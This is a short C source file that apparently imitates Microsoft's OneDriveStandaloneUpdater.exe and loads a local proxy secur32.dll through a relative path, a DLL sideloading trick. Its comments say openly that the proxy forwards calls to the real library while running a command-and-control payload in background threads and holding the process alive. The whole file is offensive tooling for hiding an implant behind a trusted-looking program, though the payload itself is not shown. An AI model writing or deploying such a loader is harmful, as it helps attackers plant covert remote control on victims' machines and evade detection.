#include <windows.h>
#include <stdio.h>

// Signature for GetUserNameExW from secur32.dll
// This is the function the real OneDriveStandaloneUpdater.exe imports.
typedef BOOLEAN (WINAPI *GetUserNameExW_t)(
    DWORD  NameFormat,
    LPWSTR lpNameBuffer,
    PULONG nSize
);

int main()
{
    HMODULE hLib = NULL;
    GetUserNameExW_t pGetUserNameExW = NULL;

    // Use a relative path to force the loader to look in the local directory first,
    // bypassing the KnownDLLs check for secur32.dll.
    // Our proxy DLL will:
    //   1. Load the REAL secur32.dll from C:\Windows\System32\
    //   2. Forward all function calls to the real DLL (so init succeeds)
    //   3. Run the C2 payload in background threads via #[ctor]
    //   4. Block on GetUserNameExW to keep the process alive
    hLib = LoadLibraryW(L".\\secur32.dll");

    if (hLib != NULL)
    {
        pGetUserNameExW = (GetUserNameExW_t)GetProcAddress(hLib, "GetUserNameExW");

        if (pGetUserNameExW != NULL)
        {
            // Call GetUserNameExW - our proxy DLL forwards to the real function,
            // then blocks the main thread indefinitely (after a few init calls),
            // keeping the process alive while background C2 threads run.
            WCHAR nameBuffer[256];
            ULONG nSize = 256;
            // NameSamCompatible = 2
            pGetUserNameExW(2, nameBuffer, &nSize);
        }

        FreeLibrary(hLib);
    }

    return 0;
}
